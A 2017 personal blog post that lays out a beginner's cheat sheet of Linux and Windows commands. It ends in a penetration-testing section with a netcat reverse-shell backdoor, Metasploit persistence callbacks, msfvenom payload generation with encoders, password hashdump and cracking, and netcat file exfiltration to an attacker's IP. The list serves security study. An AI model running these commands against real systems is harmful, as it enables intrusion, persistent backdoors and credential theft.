---
layout: post
title: "Basics Cheat Sheet"
date: 2017-09-05
---
<p>
Here is a formatted list of basic commands. I used these as I was learning how to get my way around and added to the list as I learned new things. Writing them down helped me remember the syntax.
</p>
<h6> Get Help … and other info</h6>
<ul>
<strong>
	<li><code>C:\> <command> /? </code></li>
	<li><code>root@kl~# <command> -h </code></li>
	<li><code>root@kl~# <command> --help </code></li>
	<li><code>root@kl~# man <command> </code></li>
	<li><code>root@kl~# apropos </code></li>
	<li><code>root@kl~# history </code></li>
	<li><code>root@kl~# hostname</code></li>
	<li><code>root@kl~# sudo </code></li>
	<li><code>root@kl~# whoami </code></li>
</strong>
		<ul>
		<li>(print current user id and name)</li>	
		</ul>
<strong>
	<li><code>root@kl~# date </code></li> 
	<li><code>C:\>  chdir </code></li>
</strong>
		<ul>
		<li>(displays location)</li>
		</ul>
<strong>
	<li><code>root@kl~# pwd </code></li>
</strong>
		<ul>
		<li>(displays location)</li>
		</ul>
</ul>
<h6>Processes and Things</h6>
<ul>
	<li><code>root@kl~# jobs </li></code> 
		<ul>
		<li>(list cronjobs)<li>
		</ul>
	<li><code>root@kl~# kill </li></code>
		<ul>
		<li>(stop processes)<li>
		</ul>
	<li><code>root@kl~# pkill </li></code>
		<ul>
		<li>(stop processes)<li>
		</ul>
	<li><code> root@kl~# ps –aef </li></code>
		<ul>
		(list processes status)
		</ul>
<li><code>C:\ tasklist </li></code>

<h6>Files</h6>
root@kl~# cp <src> <dst> (copy)
C:\> copy <src> <dst>
root@kl~# clear
C:\> cls
C:\> dir
root@kl~# echo <message>
(print to screen)
root@kl~# find –iname <file>
C:\> findstr /i /s <string> *.txt
(like grep for Windows)
root@kl~# file
(determine file type)
C:\> dir \ <file> /b /s
root@kl~# grep
(search files for matching text)
root@kl~# gzip
(compress or decompress files)
root@kl~# less 
(display output one screen at a time)
root@kl~# locate
root@kl~# ls
root@kl~# mkdir 
(new directory)
root@kl~# mv <src><dst> (move/rename a file)
C:\>  move <src> <dst>
root@kl~# rm (remove files)
C:\> ren (renames file)
root@kl~# umask 
(users file creation mask)
root@kl~# uniq 
(uniquify files)
root@kl~# vi/vim 
(the best text editor)
root@kl~# wc 
(print byte, word and line counts)
root@kl~# whereis 
(search $path, man pages and source files for program)
Users
root@kl~# chgrp 
(change group ownership)	
root@kl~# chmod 
(change access permissions) 
root@kl~# chown 
(change file owner and group)
root@kl~# groupadd 
(add a user to a security group)
root@kl~# passwd 
(modify user password)
root@kl~# useradd 
(create new users)
root@kl~# usermod 
(modify user account)
root@kl~# users 
(list logged in users)
Networks
root@kl~# curl (grab webpages)
root@kl~# dig (DNS lookup)
root@kl~# ifconfig
root@kl~# netstat -ano/-plant/-uplant
(networking connections)
root@kl~# nslookup
 (query name servers)
root@kl~# ping
root@kl~# ssh
root@kl~# traceroute
root@kl~# wget 
(get web pages or files)
 
 
Reconnaissance
Discover target’s IP/FQDN domain
nslookup <domain>
nslookup <ip>
Find nameserver for known domain
	root@kl~# dig <domain>
perform a zone transfer to list hosts w/in domain
	root@kl~# dig axfr @<name server> <domain>
determine route to a host
	root@kl~# traceroute <ip>
	C:\> tracert <ip
scan for services and operating system
	root@kl~# nmap –sV –O <ip> 
scan for vulns
	root@kl~# nmap --script=vulns <ip>
Gain and Maintain
establish ssh connection
	root@kl~# ssh <user>@<ip>
remote desktop (rdesktop is port 3389 and vncviewer is 5900)
	rdesktop -u <username> -p <password> <ip>
	vncviewer <ip>
favorites from the msf console
	search <keyword>
	info <module> 
	use <module>
	show options (shows you what to fill in)
	show payloads (shows payloads associated with the exploit you loaded)
	background (use to background sessions)
	pwd vs lpwd & cd vs lcd
	sessions –i <#>  (to interact with sessions)
	run persistence –h 
	run persistence –A –r <your ip> -p <port> -i 10 (call back every 10 seconds if connection is lost)
	hashdump
add a route in msf
	route add <victim subnet> <subnet mask> <session#>
	route print
make a msfvenom payload for windows executable
	root@kl~# msfvenom –p <payload> lhost=<ip> lport=<port> -f exe –i 2 > <file>.exe
	root@kl~# msfvenom –l encoders (for list of encoders)
	set up a listener in metasploit
		use exploit/multi/handler
		set payload
		set ExitOnSession false
		exploit –j (run as a job)
netcat backdoor
	root@kl~# nc –l –p <port> (on launch platform)
	C:\> start nc <launch ip> <port> -e cmd.exe
Escalate and Propagate
get passwords using meterpreter or shell (/etc/shadow or hashdump)
use john to crack NT hashes – remember to add special words you find to the password list in john
	root@kl~# ./john <file> --format=nt
transfer files with netcat
	root@kl~#  nc –l –p <port> > <file> (on your platform to listen for file)
	C:\> nc.exe <your ip> <port>  <  <file to transfer>
transfer files with python
	python –m SimpleHTTPServer <port>
